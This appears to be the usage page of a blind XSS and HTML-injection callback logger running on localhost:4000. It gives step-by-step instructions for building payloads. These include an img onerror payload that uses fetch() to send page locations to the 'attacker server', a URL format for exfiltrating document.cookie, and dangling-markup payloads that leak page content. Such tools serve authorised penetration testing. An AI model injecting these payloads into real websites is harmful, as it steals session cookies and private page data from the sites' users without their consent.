Get Started

Example URL Formats:

  • HTML injection: http://localhost:4000/?url=https://your-current-webpage&by=yourusername&plaintext=1234
  • XSS (with data exfiltration): http://localhost:4000/?url="+document.location+"&plaintext=XSSed&by=yourusername" (send with header, xsend-xss-payload )
  • XSS (with cookie exfiltration): http://localhost:4000/?url="+document.location+"&cookie=document.cookie&by=yourusername" (send with header, xsend-xss-payload )
  • Requesting/Other: http://localhost:4000/logger/{anything_goes_here}
Parameters:
  • url: specifies location of the current document/webpage
  • by: specifies username of the user that sent this payload
  • an action parameter (choices: plaintext, b64, cookie, or none (leave blank))
  • xss: specifies if it's an XSS attack
Headers for XSS testing
  • xsend-xss-payload header (This header is used to track which XSS payload was used when detection is successful)

Instructions for (blind) XSS testing

  1. 1.) Choose any action parameter such as plaintext, b64, or cookie, or none (leave blank)
  2. 2.) In this case, I'll choose plaintext
  3. 3.) Craft the url with the required parameters to the attacker server: http://localhost:4000/?url="+document.location+"&plaintext=XSSed&by=yourusername"
  4. 4.) Place it inside the fetch() function: fetch("http://localhost:4000/?url="+document.location+"&plaintext=XSSed&by=mrunoriginal")
  5. 5.) Have the fetch() function include the required headers: fetch("http://localhost:4000/?url="+document.location+"&plaintext=XSSed&by=mrunoriginal", {headers: {"xsend-xss-payload":"<img src=x onerror=fetch()>"}})
  6. 6.) Craft a payload for an XSS and insert the crafted url (Example: <img/src="x" onerror='fetch("http://localhost:4000/?url="+document.location+"&plaintext=XSSed&by=mrunoriginal", {headers: {"xsend-xss-payload":"<img src=x onerror=fetch()>"}})'>)
  7. 7.) Now you can inject this payload and wait for your webhook to receive a request

    8. <img src="x" onerror='fetch("http://localhost:4000/?url="+document.location+"&plaintext=XSSed&by=mrunoriginal", {headers: {"xsend-xss-payload":"<img src=x onerror=fetch()>"}})'>

Instructions for HTML Injection / Dangling Markup Injection

  1. 1.) Choose any action parameter such as plaintext, b64 or none (leave blank)
  2. 2.) In this case, I'll choose plaintext
  3. 3.) Craft the url with the required parameters to the attacker server: http://localhost:4000/?url=https://your-current-webpage&by=yourusername&plaintext=
  4. 4.) Craft the payload for dangling markup injection: <img src=http://localhost:4000/?url=https://your-current-webpage&by=yourusername&plaintext="
  5. 5.) Craft the payload for HTML injection: <img src=http://localhost:4000/?url=https://your-current-webpage&by=yourusername&plaintext=1234">
  6. 6.) Craft the payload for src attribute injection: http://localhost:4000/?url=https://your-current-webpage&by=yourusername&plaintext=1234
  7. 7.) Now you can inject this payload and wait for your webhook to receive a request

    8. <img src=http://localhost:4000/?url=https://your-current-webpage&plaintext="test">

Instructions for Other Blind Attacks

  2. 2.) You can now see logged requests in your webhook
